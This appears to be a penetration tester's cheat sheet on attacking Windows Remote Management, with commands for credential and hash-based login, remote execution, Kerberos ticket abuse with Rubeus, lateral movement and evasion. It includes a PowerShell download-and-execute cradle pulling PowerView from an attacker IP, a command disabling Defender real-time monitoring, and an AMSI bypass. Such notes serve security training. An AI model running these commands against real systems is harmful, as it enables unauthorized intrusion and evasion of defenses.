# 5985,5986 - WinRM

Microsoft [Windows Remote Management](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) (WinRM) is a built-in Windows feature that allows administrators to manage computers remotely. It is based on the WS-Management protocol, which is a standard method for sending management commands and data over the network. With WinRM, an administrator can run commands, execute scripts, and collect system information from remote machines without needing direct physical or desktop access.

WinRM is often used together with PowerShell to automate tasks and manage large Windows environments. It provides a secure and reliable way to communicate with remote systems by using web-based standards, making it flexible and widely compatible. By default, WinRM uses TCP port 5985 for HTTP connections and 5986 for HTTPS connections.

Access to WinRM is typically given to administrators, but members of the Remote Management Users group can also use it to connect remotely.

## Authentication

```bash
# Password-based
evil-winrm -i <ip> -u <user> -p <pass>

# Hash-based
evil-winrm -i <ip> -u <user> -H <hash>

# Certificate and key (-S -> SSL)
evil-winrm -i 10.10.11.152 -S -k <key> -c <crt>

```

## Enumeration

```bash
# Scan for open WinRM ports
nmap -p5985,5986 10.230.421.44 -A

# Test WinRM access
nxc winrm 10.230.421.44 -u x7331 -p Password123!
```

## Lateral Movement

### Windows

{% hint style="info" %}
When using the IP address instead of the hostname, we must pass explicit credentials or use the `-Authentication Negotiate` flag.
{% endhint %}

We can use PowerShell cmdlets ( [`Invoke-Command`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4), [`Enter-PSSession`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.4)) or [`winrs`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) to interact with WinRM.

{% code overflow="wrap" %}
```powershell
# RCE under the current security context
Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }

winrs -r:srv02 "powershell -c whoami;hostname"

# Credentialed RCE
$username = "BATMAN\\x7331"
$password = "Password123!"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
Invoke-Command -ComputerName 10.220.321.44 -Credential$credential -ScriptBlock { whoami; hostname }

winrs /remote:srv02 /username:x7331 /password:Password123! "powershell -c whoami;hostname"
```
{% endcode %}

#### Copy Files

WinRM can be used to transfer files after first establishing a session  [`New-PSSession`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.4).

{% code overflow="wrap" %}
```bash
# Create a new WinRM session
$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential

# Copy the target file from our local to the remote host (-Path <local-file> <remote-file>)
Copy-Item -ToSession $sessionSRV02 -Path 'C:\\Users\\x7331\\Desktop\\example.txt' -Destination 'C:\\Users\\x7331\\Desktop\\example.txt' -Verbose

# Copy the target file from the remote to the local host (-Path <remote-file> <local-file>)
Copy-Item -FromSession $sessionSRV02 -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Destination 'C:\\Users\\x7331\\Desktop\\host.txt' -Verbose
```
{% endcode %}

#### Interactive Shell

We can use the `Enter-PSSession` to get an interactive shell via WinRM.

```powershell
# Get an interactive shell on the remote host
Enter-PSSession $sessionSRV02
```

#### Hashes and Tickets

{% hint style="warning" %}
Now that we the below method, we can’t pivot further from `SVR02` due to the [double hop problem](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/understanding-kerberos-double-hop/ba-p/395463). A workaround is to use Rubeus within an interactive `SVR02` session (e.g. RDP) to forge a ticket and import it so we can use it for further authentication.
{% endhint %}

We can use Kerberos tickets to connect to PowerShell remoting using `rubeus`:

```powershell
# Forge a new ticket
.\\Rubeus.exe asktgt /user:x7332 /rc4:3223DS033D176ABAAF6BEAA0AA681400 /nowrap

# Create a sacrificial process
.\\Rubeus.exe createnetonly /program:powershell.exe /show

# Import the TGT
.\\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...

# Connect to the target host using Kerberos
Enter-PSSession SRV02.batman.local -Authentication Negotiate
```

#### PowerShell Errors

{% hint style="info" %}
The `-Authentication Negotiate` will select either Kerberos or NTLM as the underlying authentication mechanism based on what both the client and server support and prefer. We can try using it if we encounter any authentication issues.
{% endhint %}

PowerShell errors are typically related to rights, authentication method, network access, or `TrustedHost` configuration.

{% code overflow="wrap" %}
```powershell
# Kerberos only works with the FQDN!
> Enter-PSSession srv02
Enter-PSSession : Processing data from remote server srv02 failed with the following error message: WinRM cannot process the request. The following error with errorcode 0x80090322 occurred while using Kerberos authentication: An unknown security error occurred.

# TrustedHost error
> Enter-PSSession srv02 -Authentication Negotiate
Enter-PSSession : Connecting to remote server srv02 failed with the following error message : The WinRM client cannot process the request.  Default credentials with Negotiate over HTTP can be used only if the target machine is part of the TrustedHosts list or the Allow implicit credentials for Negotiate option is specified. For more information, see the about_Remote_Troubleshooting Help topic.

# If admin, otherwise use -Credentials or Invoked-Command
Set-Item WSMan:localhost\\client\\trustedhosts -value * -Force
```
{% endcode %}

### Linux

```bash
# RCE via WinRM (x -> cmd.exe / X -> PowerShell.exe)
netexec winrm 10.220.321.44 -u x7331 -p Password123! -x "ipconfig"
```

We can use `evil-wirnrm` to load PowerShell scripts:

```powershell
# Get a shell via WinRM
evil-winrm -i 10.220.321.44 -u 'batman.local\\x7331y' -p Password123!

# List evil-winrm's menu
*Evil-WinRM* PS C:\\Users\\x7331\\Documents> menu

# Load a PowerShell script via WinRM (scripts/ contains PowerView.ps1)
evil-winrm -i 10.220.321.44 -u 'batman.local\\x7331y' -p Password123! -s '/home/scripts/'

# Import PowerView
*Evil-WinRM* PS C:\\Users\\x7331\\Documents> PowerView.ps1

# List PowerView's modules
*Evil-WinRM* PS C:\\Users\\x7331\\Documents> menu
[+] Add-DomainGroupMember
[+] Add-DomainObjectAcl
[+] Add-RemoteConnection
```

### PSWA

{% hint style="warning" %}
The username needs to be in the format of `domain\\user` and the computer name as the `FQDN`.
{% endhint %}

[Windows PowerShell Web Access](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611\(v=ws.11\)) provides a web-based interface for accessing PowerShell sessions remotely. This feature allows users to run PowerShell commands and scripts from a web browser, offering flexibility and convenience for remote management tasks. By default the URL path for PSWA is `/pswa` and the port will be 80 or 443.

PSWA is not very efficient for retrieving large amounts of information as it connects to the target to retrieve each line. As a result, we can use `Base64` encoding to speed up the process.

{% code overflow="wrap" %}
```powershell
# PSWA command
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\\Windows\\System32\\drivers\\etc\\hosts"))

# Decode and read the file (replace the break lines)
cat hosts_base64.txt | base64 -d > hosts
```
{% endcode %}

In case we want to use `PowerView` through PSWA we may get the following error.

```powershell
> IEX(New-Object Net.WebClient).DownloadString('<http://10.10.14.87/PowerView.ps1>')
> Get-DomainUser
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At line:5253 char:20+             else {$Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
 + FullyQualifiedErrorId : DirectoryServicesCOMException
```

To prevent this from happening, we must specify credentials.

{% code overflow="wrap" %}
```powershell
$username = "BATMAN\\x7331"
$password = "Password123!"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
Get-DomainUser -Credential$credential -FindOne
```
{% endcode %}

## Attacks

### AMSI Bypass

{% hint style="info" %}
Try [AMSI.fail](https://amsi.fail/).
{% endhint %}

```powershell
# Disable AMSI
> set-mppreference —disablerealtimemonitoring $true
```

Try `evil-winrm`'s module.

```powershell
# 1. Check if AMSI is enabled

> #amsiscanbuffer
At line:1 char:1
+ #amsiscanbuffer
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.

# Load the module
> Bypass-4MSI

Info: Patching 4MSI, please be patient...
[+] Success!

# Confirm that it worked
> #amsiscanbuffer
```

## PowerShell Remoting

{% hint style="info" %}
Creating a PowerShell remoting session via WinRM in a bind shell can cause unexpected behavior. Opt for `evil-winrm` instead.
{% endhint %}

PowerShell Remoting by default uses WinRM for cmdlets such as `Enter-PSSession`. Therefore, a user needs to be in the local group `Remote Management Users` to be a valid user to use them. However, instead of WinRM, SSH can also be used for PowerShell remoting.

{% code overflow="wrap" %}
```powershell
> $password = ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force

> $cred = New-Object System.Management.Automation.PSCredential("x7331", $password)

> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```
{% endcode %}
